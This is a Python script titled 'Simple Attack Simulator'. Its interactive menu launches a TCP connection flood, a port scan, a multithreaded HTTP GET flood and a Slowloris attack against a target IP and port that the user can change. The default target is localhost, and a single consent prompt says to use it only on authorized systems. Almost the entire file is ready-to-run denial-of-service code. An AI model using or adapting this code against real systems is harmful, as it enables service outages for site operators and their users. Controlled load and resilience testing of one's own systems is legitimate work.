"""
Simple Attack Simulator - Windows Compatible
No raw packets needed - Uses standard socket library
"""

import socket
import threading
import time
import random
from datetime import datetime

# ============================================
# Configuration
# ============================================

TARGET_IP = "127.0.0.1"
TARGET_PORT = 8080

class SimpleAttackSimulator:
    
    def __init__(self, target_ip, target_port):
        self.target_ip = target_ip
        self.target_port = target_port
        self.running = False
        self.connections = 0
        
    def tcp_connection_flood(self, duration=10, threads=10):
        """
        TCP Connection Flood
        Opens many TCP connections to exhaust server resources
        """
        print(f"\n{'='*70}")
        print("🚨 TCP CONNECTION FLOOD ATTACK")
        print(f"{'='*70}")
        print(f"Target: {self.target_ip}:{self.target_port}")
        print(f"Duration: {duration} seconds")
        print(f"Threads: {threads}")
        print(f"Starting attack...\n")
        
        self.running = True
        self.connections = 0
        start_time = time.time()
        
        def attack_thread():
            while time.time() - start_time < duration and self.running:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(1)
                    sock.connect((self.target_ip, self.target_port))
                    self.connections += 1
                    # Keep connection open briefly
                    time.sleep(0.1)
                    sock.close()
                except:
                    pass
        
        # Start threads
        threads_list = []
        for _ in range(threads):
            t = threading.Thread(target=attack_thread)
            t.daemon = True
            t.start()
            threads_list.append(t)
        
        # Monitor progress
        try:
            while time.time() - start_time < duration and self.running:
                elapsed = time.time() - start_time
                rate = self.connections / elapsed if elapsed > 0 else 0
                print(f"[{elapsed:.1f}s] Connections: {self.connections} | Rate: {rate:.1f} conn/s")
                time.sleep(2)
        except KeyboardInterrupt:
            print("\n⚠️  Attack interrupted")
            self.running = False
        
        # Wait for threads
        for t in threads_list:
            t.join(timeout=1)
        
        elapsed = time.time() - start_time
        print(f"\n{'='*70}")
        print("✅ Attack completed")
        print(f"{'='*70}")
        print(f"Total connections: {self.connections}")
        print(f"Duration: {elapsed:.2f} seconds")
        print(f"Average rate: {self.connections/elapsed:.2f} conn/sec\n")
    
    def port_scan_simple(self, port_range=(20, 100)):
        """
        Simple Port Scanner using socket
        Checks which ports are open
        """
        print(f"\n{'='*70}")
        print("🔍 PORT SCAN")
        print(f"{'='*70}")
        print(f"Target: {self.target_ip}")
        print(f"Port range: {port_range[0]}-{port_range[1]}")
        print(f"Scanning...\n")
        
        open_ports = []
        start_time = time.time()
        
        for port in range(port_range[0], port_range[1] + 1):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.5)
                result = sock.connect_ex((self.target_ip, port))
                
                if result == 0:
                    open_ports.append(port)
                    print(f"✅ Port {port}: OPEN")
                
                sock.close()
                
                # Progress
                if port % 20 == 0:
                    progress = ((port - port_range[0]) / (port_range[1] - port_range[0])) * 100
                    print(f"Progress: {progress:.0f}%")
                    
            except KeyboardInterrupt:
                print("\n⚠️  Scan interrupted")
                break
            except:
                pass
        
        elapsed = time.time() - start_time
        print(f"\n{'='*70}")
        print("✅ Scan completed")
        print(f"{'='*70}")
        print(f"Ports scanned: {port_range[1] - port_range[0] + 1}")
        print(f"Open ports: {len(open_ports)}")
        if open_ports:
            print(f"Open ports list: {', '.join(map(str, open_ports))}")
        print(f"Duration: {elapsed:.2f} seconds\n")
    
    def http_flood_simple(self, duration=10, threads=5):
        """
        HTTP GET Flood
        Sends many HTTP requests
        """
        print(f"\n{'='*70}")
        print("🌐 HTTP GET FLOOD")
        print(f"{'='*70}")
        print(f"Target: {self.target_ip}:{self.target_port}")
        print(f"Duration: {duration} seconds")
        print(f"Threads: {threads}")
        print(f"Starting...\n")
        
        self.running = True
        self.connections = 0
        start_time = time.time()
        
        def flood_thread():
            while time.time() - start_time < duration and self.running:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(2)
                    sock.connect((self.target_ip, self.target_port))
                    
                    # Send HTTP GET
                    request = f"GET /?{random.randint(1,999999)} HTTP/1.1\r\n"
                    request += f"Host: {self.target_ip}\r\n"
                    request += "User-Agent: Mozilla/5.0\r\n\r\n"
                    
                    sock.send(request.encode())
                    self.connections += 1
                    sock.close()
                    
                except:
                    pass
                
                time.sleep(0.01)
        
        # Start threads
        threads_list = []
        for _ in range(threads):
            t = threading.Thread(target=flood_thread)
            t.daemon = True
            t.start()
            threads_list.append(t)
        
        # Monitor
        try:
            while time.time() - start_time < duration and self.running:
                elapsed = time.time() - start_time
                rate = self.connections / elapsed if elapsed > 0 else 0
                print(f"[{elapsed:.1f}s] Requests: {self.connections} | Rate: {rate:.1f} req/s")
                time.sleep(2)
        except KeyboardInterrupt:
            print("\n⚠️  Attack interrupted")
            self.running = False
        
        # Wait
        for t in threads_list:
            t.join(timeout=1)
        
        elapsed = time.time() - start_time
        print(f"\n{'='*70}")
        print("✅ Attack completed")
        print(f"{'='*70}")
        print(f"Total requests: {self.connections}")
        print(f"Duration: {elapsed:.2f} seconds\n")
    
    def slowloris_attack(self, duration=30, sockets_count=200):
        """
        Slowloris Attack - Low & Slow
        Keeps connections open with incomplete HTTP requests
        """
        print(f"\n{'='*70}")
        print("🐌 SLOWLORIS ATTACK")
        print(f"{'='*70}")
        print(f"Target: {self.target_ip}:{self.target_port}")
        print(f"Sockets: {sockets_count}")
        print(f"Duration: {duration} seconds")
        print(f"Starting...\n")
        
        sockets_list = []
        start_time = time.time()
        
        # Create initial connections
        print("Creating initial connections...")
        for i in range(sockets_count):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(4)
                sock.connect((self.target_ip, self.target_port))
                
                # Send incomplete HTTP request
                sock.send(f"GET /?{random.randint(1,999)} HTTP/1.1\r\n".encode())
                sock.send(f"Host: {self.target_ip}\r\n".encode())
                
                sockets_list.append(sock)
                
                if (i+1) % 50 == 0:
                    print(f"Created {i+1}/{sockets_count} connections")
            except:
                pass
        
        print(f"\n✅ {len(sockets_list)} connections established")
        print("Keeping connections alive...\n")
        
        # Keep connections alive
        try:
            while time.time() - start_time < duration:
                elapsed = time.time() - start_time
                print(f"[{elapsed:.1f}s] Active connections: {len(sockets_list)}")
                
                # Send keep-alive headers
                for sock in sockets_list[:]:
                    try:
                        sock.send(f"X-a: {random.randint(1,5000)}\r\n".encode())
                    except:
                        sockets_list.remove(sock)
                
                time.sleep(10)
                
        except KeyboardInterrupt:
            print("\n⚠️  Attack interrupted")
        
        # Close all sockets
        for sock in sockets_list:
            try:
                sock.close()
            except:
                pass
        
        elapsed = time.time() - start_time
        print(f"\n{'='*70}")
        print("✅ Attack completed")
        print(f"{'='*70}")
        print(f"Duration: {elapsed:.2f} seconds\n")

# ============================================
# Menu
# ============================================

def show_menu():
    print("\n" + "="*70)
    print("⚔️  SIMPLE ATTACK SIMULATOR (Windows Compatible)")
    print("="*70)
    print("\n1. TCP Connection Flood")
    print("2. Port Scan")
    print("3. HTTP GET Flood")
    print("4. Slowloris Attack (Low & Slow)")
    print("5. Configure Target")
    print("6. Exit")
    print("\n" + "="*70)

def configure_target():
    global TARGET_IP, TARGET_PORT
    
    print(f"\nCurrent: {TARGET_IP}:{TARGET_PORT}")
    
    new_ip = input("Target IP (Enter to keep): ").strip()
    if new_ip:
        TARGET_IP = new_ip
    
    new_port = input("Target port (Enter to keep): ").strip()
    if new_port:
        TARGET_PORT = int(new_port)
    
    print(f"✅ Target: {TARGET_IP}:{TARGET_PORT}")

def main():
    print("\n" + "="*70)
    print("🚀 SIMPLE ATTACK SIMULATOR")
    print("="*70)
    print("\n⚠️  Use only on authorized systems!")
    
    response = input("\nAgree? (yes/no): ").lower()
    if response != 'yes':
        return
    
    simulator = SimpleAttackSimulator(TARGET_IP, TARGET_PORT)
    
    while True:
        show_menu()
        choice = input("\nOption (1-6): ").strip()
        
        if choice == '1':
            duration = int(input("Duration (seconds, default 10): ") or 10)
            threads = int(input("Threads (default 10): ") or 10)
            simulator.tcp_connection_flood(duration=duration, threads=threads)
        
        elif choice == '2':
            start = int(input("Start port (default 20): ") or 20)
            end = int(input("End port (default 100): ") or 100)
            simulator.port_scan_simple(port_range=(start, end))
        
        elif choice == '3':
            duration = int(input("Duration (seconds, default 10): ") or 10)
            threads = int(input("Threads (default 5): ") or 5)
            simulator.http_flood_simple(duration=duration, threads=threads)
        
        elif choice == '4':
            duration = int(input("Duration (seconds, default 30): ") or 30)
            sockets = int(input("Sockets count (default 200): ") or 200)
            simulator.slowloris_attack(duration=duration, sockets_count=sockets)
        
        elif choice == '5':
            configure_target()
        
        elif choice == '6':
            break
        
        input("\nPress Enter...")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\nExiting...")